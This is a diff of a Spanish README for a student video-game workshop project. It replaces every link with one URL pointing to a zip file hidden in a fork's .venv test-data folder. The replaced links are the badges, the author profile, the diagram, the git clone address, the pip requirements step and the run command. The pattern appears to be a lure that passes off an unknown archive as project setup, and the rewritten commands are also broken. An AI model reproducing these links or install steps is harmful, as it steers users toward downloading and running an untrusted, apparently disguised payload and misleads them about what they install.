@@ -1,13 +1,13 @@
 # Taller Videojuegos
 
-![commits](https://badgen.net/github/commits/UR-CC/lpa1-taller-videojuegos?icon=github) 
-![last_commit](https://img.shields.io/github/last-commit/UR-CC/lpa1-taller-videojuegos)
+![commits](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) 
+![last_commit](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
 
-- ver [badgen](https://badgen.net/) o [shields](https://shields.io/) para otros tipos de _badges_
+- ver [badgen](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) o [shields](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) para otros tipos de _badges_
 
 ## Autor
 
-- [@estudiante](https://www.github.com/estudiante)
+- [@estudiante](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
 
 ## Descripción del Proyecto
 
@@ -105,14 +105,14 @@ El proyecto se dividirá en varias fases, comenzando con la creación de clases 
 
 ## Diseño
 
-![Diagrama de Clases](./docs/diagramas.png)
+![Diagrama de Clases](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
 
 ## Instalación
 
 1. Clonar el proyecto
 
 ```bash
-git clone https://github.com/UR-CC/lpa1-taller-videojuegos.git
+git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
 cd lpa1-taller-videojuegos
 ```
 
@@ -126,7 +126,7 @@ venv/bin/activate
 3. Instalar librerías y dependencias
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
 ```
     
 ## Ejecución
@@ -135,6 +135,6 @@ pip install -r requirements.txt
 
 ```bash
 cd lpa1-taller-videojuegos
-python main.py
+python https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
 ```
 
